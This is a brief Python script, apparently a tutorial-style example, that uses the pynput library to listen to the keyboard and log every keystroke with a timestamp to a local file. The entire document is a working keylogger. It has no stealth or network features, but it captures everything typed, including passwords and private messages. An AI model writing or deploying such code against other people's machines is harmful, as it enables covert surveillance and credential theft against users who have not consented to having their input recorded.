from pynput.keyboard import Key, Listener
import logging

#Imported all the needed files

log_dir = "logs/"

#Set the directory to place the file that logs the keys pressed after this program begins to run

logging.basicConfig(filename = (log_dir + "key_log.txt"), level = logging.DEBUG, format = '%(asctime)s: %(message)s')

#Set the filename and format

def on_press(key):
    logging.info(str(key))
    
#Log the keys    
    
with Listener(on_press = on_press) as listener:
    listener.join()

#Join the strings
